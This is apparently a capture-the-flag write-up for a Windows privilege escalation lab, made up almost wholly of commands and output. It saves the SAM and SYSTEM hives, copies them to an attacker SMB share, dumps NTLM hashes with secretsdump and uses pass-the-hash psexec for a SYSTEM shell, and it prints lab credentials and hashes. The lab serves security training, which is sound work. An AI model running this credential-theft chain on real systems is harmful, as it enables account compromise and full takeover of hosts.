# About This Module
Module link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/08/2023

```PowerShell
C:\Windows\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```PowerShell
C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.
```

```PowerShell
C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive           
The operation completed successfully.
```

```Bash
root@ip-10-10-174-220:~# mkdir share
```

```Bash
root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```PowerShell
C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.10.174.220\public\                                                                                1 file(s) copied.
```

```Bash
[*] Incoming connection (10.10.160.214,49770)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:18909ffd6a713ab97c95d0afdec779fe:010100000000000080db871c35c7d901da9b2ad82045ddfa00000000010010005500750068004a005500440065006100030010005500750068004a005500440065006100020010007900660056006800700073004d006c00040010007900660056006800700073004d006c000700080080db871c35c7d9010600040002000000080030003000000000000000000000000030000066375d7e28857eb587212f56dfdc68cc77fc1bad71a82ca14c5537d668b1a0930a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100370034002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.160.214,49770)
[*] Remaining connections []
```

```PowerShell
C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.10.174.220\public\                                                                                 1 file(s) copied.
```

```Bash
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.160.214,49770)
[*] Remaining connections []
[*] Incoming connection (10.10.160.214,49777)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:49979ee56a3e931f05fbb73e33da8154:0101000000000000003f774435c7d901b5e29d5a6fcea66f00000000010010005500750068004a005500440065006100030010005500750068004a005500440065006100020010007900660056006800700073004d006c00040010007900660056006800700073004d006c0007000800003f774435c7d9010600040002000000080030003000000000000000000000000030000066375d7e28857eb587212f56dfdc68cc77fc1bad71a82ca14c5537d668b1a0930a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100370034002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.160.214,49777)
[*] Remaining connections []
```

```Bash
root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/secretsdump.py -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up...
```

```Bash
root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.160.214
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.10.160.214.....
[*] Found writable share ADMIN$
[*] Uploading file KgzHWirv.exe
[*] Opening SVCManager on 10.10.160.214.....
[*] Creating service nEfC on 10.10.160.214.....
[*] Starting service nEfC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

```PowerShell
C:\Windows\system32> whoami
nt authority\system
```

```PowerShell
C:\Windows\system32> dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/04/2022  12:58 PM    <DIR>          .
05/04/2022  12:58 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/04/2022  12:59 PM                20 flag.txt
               3 File(s)          1,101 bytes
               2 Dir(s)  15,586,996,224 bytes free
```

```PowerShell
C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
THM{SEFLAGPRIVILEGE}
```
